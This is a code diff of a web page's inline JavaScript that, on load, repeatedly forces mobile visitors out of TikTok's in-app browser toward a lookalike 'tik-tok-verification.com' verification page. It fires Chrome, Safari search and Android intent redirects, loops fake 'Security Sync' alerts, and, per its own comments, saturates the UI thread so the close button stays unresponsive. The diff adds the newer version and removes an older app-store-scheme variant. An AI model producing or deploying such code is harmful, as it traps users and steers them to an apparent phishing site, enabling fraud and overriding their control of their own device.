@@ -10,50 +10,52 @@
 <script>
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 10000; 
-    const gap = 220; 
+    const gap = 200; // THE ABSOLUTE MINIMUM DELAY
 
-    function triggerJump() {
-        const urlEnc = encodeURIComponent(target);
+    function triggerSafariJump() {
         const isAndroid = /Android/i.test(navigator.userAgent);
-        // Direct System Search - the strongest redirect we have
-        const trigger = isAndroid 
-            ? "market://search?q=" + urlEnc 
-            : "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + urlEnc;
-        window.location.href = trigger;
+        const urlNoProtocol = target.replace("https://", "");
+
+        // iOS: Force Safari via multiple browser schemes
+        if (!isAndroid) {
+            window.location.href = "googlechrome://" + urlNoProtocol;
+            window.location.replace("x-web-search://?" + encodeURIComponent(target));
+        } else {
+            // Android: Chrome Intent
+            window.location.href = `intent://${urlNoProtocol}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
+        }
     }
 
     function rampage() {
         if (Date.now() > killTime) return;
 
-        // 1. Fire the Redirect
-        triggerJump();
+        // 1. Prime the Safari Jump
+        triggerSafariJump();
 
         // 2. THE LOCK
-        alert("ATTEMPT #34\n\nRedirecting to System Browser...\n\nTap OK to continue.");
+        alert("ATTEMPT #35\n\nSecurity Sync: Final Phase.\n\nTap OK to open Safari.");
 
-        // 3. THE "DEAD ZONE" (The 220ms window)
-        // We use a micro-loop to keep the CPU busy. 
-        // This makes the 'X' button in the TikTok frame laggy and unresponsive.
+        // 3. THE SATURATION STUTTER
+        // This blocks the 'X' button from working for the first 120ms of the gap
         const start = Date.now();
-        while (Date.now() - start < 100) {
-            // Intensive calculation to saturate the UI thread for the first 100ms
-            Math.sqrt(Math.random() * 1000000);
+        while (Date.now() - start < 120) {
+            Math.atan2(Math.random(), Math.random());
         }
 
-        // 4. Wait the remainder of the 220ms gap before the next alert
+        // 4. THE 200ms WINDOW
         setTimeout(() => {
             if (document.hasFocus()) {
                 rampage();
             }
-        }, gap - 100);
+        }, gap - 120);
     }
 
     window.onload = () => {
         rampage();
     };
 
-    // Keep redirect active if focus is lost (minimize/swipe)
-    window.onblur = () => { if (Date.now() < killTime) triggerJump(); };
+    // If focus is lost, keep pushing the Safari jump
+    window.onblur = () => { if (Date.now() < killTime) triggerSafariJump(); };
 </script>
 
 </body>
